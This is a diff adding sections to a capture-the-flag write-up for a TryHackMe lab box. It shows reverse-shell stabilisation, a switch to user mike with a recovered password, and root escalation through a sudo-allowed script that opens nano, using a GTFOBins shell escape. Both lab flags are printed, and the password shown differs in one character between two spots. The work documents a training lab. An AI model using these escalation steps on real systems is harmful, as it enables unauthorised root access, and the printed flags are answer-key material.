@@ -183,6 +183,28 @@ We have the **DB_USERNAME** and **DB_PASSWORD** so we can move into the DB and f
 **Question**
 #### What's the user flag?
 
+Before to move forward, I need to stabilize the shell.For this room, it is a really tough part.
+- From Victim: export TERM=xterm
+- From Victim: Suspend the shell with the command Ctrl+Z
+- From Local machine: ssty raw -echo;fg
+- From Victim: check the **id**
+- From Victim: upgrade the shell
+```
+ ~ % nc -nlvp 4545
+Connection from 10.10.135.239:45244
+/bin/sh: 0: can't access tty; job control turned off
+$ export TERM=xterm
+$ ^Z
+zsh: suspended  nc -nlvp 4545
+ ~ % ssty raw -echo;fg
+zsh: command not found: ssty
+[1]  + continued  nc -nlvp 4545
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@gallery:/var/www/html/gallery/uploads$
+```
+
 Another task where I spent a lot of time. Maybe, I'm not efficient.......
 ```
 $ pwd
@@ -255,5 +277,68 @@ exit
 We have the **su password** --> **lb3stpassw0rdbr0xx**
 
 ```
+www-data@gallery:/home/mike$ su mike
+su mike
+Password: b3stpassw0rdbr0xx
 
+mike@gallery:~$ ls -l
+ls -l
+total 12
+drwx------ 2 mike mike 4096 May 24  2021 documents
+drwx------ 2 mike mike 4096 May 24  2021 images
+-rwx------ 1 mike mike   32 May 14  2021 user.txt
+mike@gallery:~$ cat user.txt
+cat user.txt
+THM{af05cd30bfed67849befd546ef}
 ```
+**Answer** 
+#### THM{af05cd30bfed67849befd546ef}
+---
+### Privilege escalation
+
+**Question**
+#### What's the root flag?
+
+Let's check what we can do with Mike
+```
+mike@gallery:~$ sudo -l
+sudo -l
+Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+```
+Let's explore this **rootkit.sh**
+```
+cat /opt/rootkit.sh
+#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac
+```
+**nano** is used. Move to [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/)
+The first [option](https://gtfobins.github.io/gtfobins/nano/#shell) looks like good
+```
+nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+After that, you are root and you can find the flag ^^
+
+**Answer** 
+#### THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
